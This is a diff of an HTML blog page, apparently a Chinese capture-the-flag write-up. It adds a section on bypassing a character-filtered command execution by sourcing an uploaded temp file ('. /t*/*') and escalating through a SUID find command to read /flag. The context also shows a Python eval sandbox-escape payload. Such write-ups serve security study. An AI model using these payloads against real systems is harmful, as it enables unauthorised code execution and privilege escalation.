@@ -265,7 +265,7 @@
 
 	<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" itemprop="url">
 		<time datetime="2024-08-25T02:03:00.000Z" itemprop="dateUpdated">
-	  		2024-08-25
+	  		2024-08-27
 	  </time>
 	</a> 
 
@@ -356,9 +356,20 @@
 <p>整合一下payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.__init__.__globals__.__builtins__.eval(&quot;setattr(__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;],&#x27;__file__&#x27;,&#x27;/flag&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
 
+<h1 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h1><p><a target="_blank" rel="noopener" href="http://8.137.112.104/?p=15">http://8.137.112.104/?p=15</a></p>
+<h1 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h1><p>扫后台发现&#x2F;admin.html，这里可以文件上传，并执行命令。</p>
+<p><img src="/img/dfjk/QQ_1724744695876.png" alt="QQ_1724744695876"></p>
+<p>但是命令执行过滤了基本所有字符，留下的只有：</p>
+<p>命令部分fuzz出来的可用字符为t * . &#x2F;</p>
+<p>只能执行临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /t*/*</span><br></pre></td></tr></table></figure>
 
-
-
+<p><strong>通过.(点，也就是 source命令)去执行&#x2F;tmp目录里的文件</strong></p>
+<p><img src="/img/dfjk/67a60b82f0a64abdb24b4041531f392b.png" alt="67a60b82f0a64abdb24b4041531f392b"></p>
+<p>flag没有权限读，尝试提权，发现find命令有suid权限：</p>
+<p><img src="/img/dfjk/42dc5d58fe364771a2e7bb088d7266e4.png" alt="42dc5d58fe364771a2e7bb088d7266e4"></p>
+<p>直接find执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec cat /flag \;</span><br></pre></td></tr></table></figure>
 
 	
 		</div>
